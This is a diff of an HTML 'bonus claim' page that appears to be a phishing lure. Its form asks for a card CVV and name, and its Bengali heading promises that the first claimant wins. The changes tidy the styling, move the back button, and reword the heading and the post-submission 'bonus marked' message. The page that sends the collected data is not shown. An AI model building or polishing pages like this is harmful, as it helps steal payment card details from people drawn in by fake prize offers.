@@ -4,8 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>245 Bonus</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"> <style>
-
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,16 +15,18 @@
             height: 100vh;
             margin: 0;
             background-image: url('bg.jpg');
+            position: relative;
         }
         .claim-button1 {
-            background-color:#83aff0;
+            background-color: #83aff0;
             color: black;
             border: none;
-          border-radius:25px;
-    font-size:28px;
+            border-radius: 25px;
+            font-size: 28px;
             cursor: pointer;
-            margin-top: 0;
-            margin-right: 20px;
+            position: absolute;
+            top: 10px;
+            left: 10px;
         }
         .form-container {
             background-color: #fff;
@@ -79,7 +80,7 @@
     <button class="claim-button1" onclick="window.history.back()"><i class="fas fa-circle-arrow-left"></i></button>
 
     <div class="form-container">
-        <h2>দুই-চার-পাচঁ</h2>
+        <h2>প্রথম জন হবে বিজয়ী</h2>
         <form id="bonusForm">
             <label for="username">Account:</label>
             <input type="tel" id="username" placeholder="CVV / Name" required>
@@ -118,7 +119,7 @@
                     var submitButton = document.getElementById('submit-button');
                     submitButton.style.display = 'none';
                     var confirmationMessage = document.getElementById('confirmation-message');
-                    confirmationMessage.textContent = 'Thank you! Your bonus has been claimed 😉.';
+                    confirmationMessage.textContent = 'hey! Your bonus has been marked. 😉.';
                     confirmationMessage.style.display = 'block';
                 })
                 .catch((error) => {
